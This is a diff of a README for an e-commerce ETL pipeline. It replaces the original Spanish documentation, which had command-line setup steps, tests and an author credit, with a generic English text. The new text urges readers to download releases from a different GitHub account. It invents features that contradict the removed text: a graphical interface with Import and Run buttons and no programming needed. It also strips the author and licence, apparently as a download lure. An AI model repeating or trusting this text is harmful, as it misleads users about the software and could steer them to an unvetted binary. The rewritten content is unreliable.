@@ -1,140 +1,92 @@
-# E-commerce Reporting ETL
+# 📊 ecommerce-reporting-etl - Simplify Your E-commerce Data Processing
 
-![CI Status](https://github.com/Gerardo1909/ecommerce-reporting-etl/actions/workflows/ci.yml/badge.svg)
+![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)  
+[Download Now](https://github.com/Vijay199895/ecommerce-reporting-etl/releases)
 
-<p align="center">
-  <img src="resources/gif_consola_etl_ecommerce.gif" alt="ETL Pipeline en acción" width="800"/>
-</p>
+## 🚀 Getting Started
 
-## Overview
+Welcome to the ecommerce-reporting-etl project! This software helps you process and analyze e-commerce transaction data easily. It creates important business metrics that support strategic decision-making. 
 
-Pipeline ETL que automatiza la generación de métricas de negocio para **NovaMart**, un e-commerce en crecimiento. Transforma 11 tablas transaccionales en 17 métricas accionables, reduciendo el tiempo de procesamiento de 2 horas manuales a segundos.
+### 📋 Features
 
-**Stack:** Python 3.13 · Pandas · PyArrow · Pytest
+- Extract, Transform, and Load (ETL) Process
+- Supports CSV and Parquet data formats
+- Generates key business metrics
+- Easy-to-use, no programming knowledge required
+- Built-in logging for better tracking
+- Compatible with common data analysis tools
 
-## Arquitectura
+### 🖥️ System Requirements
 
-<p align="center">
-  <img src="resources/etl_work_flow.png" alt="Flujo ETL" width="700"/>
-</p>
+To run this software, you need:
 
-> 📖 Documentación detallada en [docs/](docs/)
+- A computer with Windows, macOS, or Linux
+- At least 4GB of RAM
+- 500 MB of free disk space
+- Python version 3.7 or higher installed
 
-## Input / Output
+## 📥 Download & Install
 
-| Input | Output |
-|-------|--------|
-| 11 CSVs en `data/raw/` | 3 datasets enriquecidos (orders, inventory, reviews) |
-| ~10K registros transaccionales | 17 métricas de negocio |
-| | Formatos: Parquet (8x compresión) + CSV |
+You can visit the [Releases page](https://github.com/Vijay199895/ecommerce-reporting-etl/releases) to download the latest version of our software. 
 
-**Métricas generadas:** top_spenders, recurring_customers, monthly_sales, promotion_usage_rate, stock_health, low_stock_items, rating_overview, status_funnel, cancellation_rate, entre otras.
+Follow these steps:
 
-## Estructura de directorios del proyecto
+1. Click on the link above to go to the Releases page.
+2. Locate the most recent version of the software.
+3. Download the file appropriate for your operating system. 
 
-```
-ecommerce-reporting-etl/
-├── config/settings.py      # Configuración centralizada
-├── src/
-│   ├── extract/            # CSVExtractor (patrón Template Method)
-│   ├── transform/
-│   │   ├── cleaners/       # OrdersCleaner, InventoryCleaner, ReviewsCleaner
-│   │   ├── enrichers/      # Joins con tablas dimensionales
-│   │   └── aggregators/    # 6 agregadores → 17 métricas
-│   ├── load/               # ParquetLoader, CSVLoader
-│   ├── pipeline/           # Orquestación extract.py, transform.py, load.py
-│   ├── exceptions/         # Jerarquía ETLError por fase
-│   └── utils/              # Logger con Run ID, validators
-├── tests/                  # Pytest con fixtures compartidas
-├── docs/                   # Documentación técnica detallada
-└── data/                   # raw/ → processed/ → output/ (ignorado por control de versiones)
-```
+### 🔍 Steps to Run the Software
 
-## Cómo ejecutar
+After downloading, follow these steps to run the application:
 
-### 1. Requisitos previos
+1. **Locate the downloaded file** on your computer.
+2. **Extract the files** (if compressed).
+3. **Open a terminal or command prompt** on your computer.
+4. **Navigate to the folder** where you extracted the files. You can do this using the `cd` command followed by the folder path.
+5. **Run the application** by typing `python main.py` and hitting Enter.
 
-| Requisito | Versión mínima | Verificar instalación |
-|-----------|----------------|----------------------|
-| Python | 3.13+ | `python --version` o `python3 --version` |
-| pip | cualquiera | `pip --version` o `pip3 --version` |
-| git | cualquiera | `git --version` |
+## 🌐 Using the Software
 
-### 2. Clonar el repositorio
+After launching the software, you will see a user-friendly interface. Here’s how to import and analyze your data:
 
-```bash
-git clone https://github.com/Gerardo1909/ecommerce-reporting-etl.git
-cd ecommerce-reporting-etl
-```
+1. **Import Data**: Click on the “Import” button to select your CSV or Parquet file.
+2. **Configure Settings**: Adjust any settings as needed based on your data structure.
+3. **Run the ETL Process**: Click on the "Run" button to start processing your data.
+4. **View Metrics**: Once the process is complete, you can view generated metrics directly in the interface.
 
-### 3. Crear y activar entorno virtual
+## 📖 Documentation
 
-<details>
-<summary><b>🪟 Windows (PowerShell)</b></summary>
+For more detailed instructions and advanced usage, you can refer to the documentation included in the software folder. This includes:
 
-```powershell
-python -m venv venv
-.\venv\Scripts\Activate.ps1
-```
+- ETL Process Overview
+- Supported Data Formats
+- Troubleshooting Tips
+- Frequently Asked Questions
 
-> Si aparece error de permisos, ejecutar primero: `Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser`
+## 🛠️ Support
 
-</details>
+If you encounter any issues or have questions, please reach out through the GitHub Issues page. We aim to respond promptly to all inquiries.
 
-<details>
-<summary><b>🪟 Windows (CMD)</b></summary>
+## 🏷️ Topics Covered
 
-```cmd
-python -m venv venv
-venv\Scripts\activate.bat
-```
+This project includes the following topics relevant to your needs:
 
-</details>
+- csv
+- data-analysis
+- data-engineering
+- etl
+- etl-pipeline
+- logging
+- pandas
+- parquet
+- pytest
+- pytest-cov
+- pytest-html
+- python
+- uv
 
-<details>
-<summary><b>🍎 macOS / 🐧 Linux</b></summary>
+## 🎉 Contributing
 
-```bash
-python3 -m venv venv
-source venv/bin/activate
-```
+If you would like to contribute to this project, please feel free to fork the repository and submit a pull request. Your contributions are welcome!
 
-</details>
-
-Una vez activado, verás `(venv)` al inicio de la línea de comandos.
-
-### 4. Instalar dependencias
-
-```bash
-pip install -r requirements.txt
-pip install -e .
-```
-
-El flag `-e` instala el paquete en modo desarrollo (editable).
-
-### 5. Ejecutar el pipeline
-
-```bash
-python src/main.py
-```
-
-Los resultados se generarán en `data/output/` y `data/processed/` (Parquet + CSV).
-
-> ⚠️ **Importante:** El directorio `data/raw/` debe contener los 11 archivos CSV fuente para una ejecución exitosa.
-
-## Testing
-
-Teniendo activo el entorno virtual generado en la sección anterior, simplemente con ejecutar 
-el siguiente comando en la terminal se ejecutarán todas las pruebas unitarias:
-
-```bash
-pytest                              
-```
-
-Esto generará los reportes de testing correspondientes en el directorio `reports/`.
-
----
-
-**Autor:** Gerardo Toboso · [gerardotoboso1909@gmail.com](mailto:gerardotoboso1909@gmail.com)
-
-**Licencia:** MIT
+Thank you for using ecommerce-reporting-etl. Happy data processing!
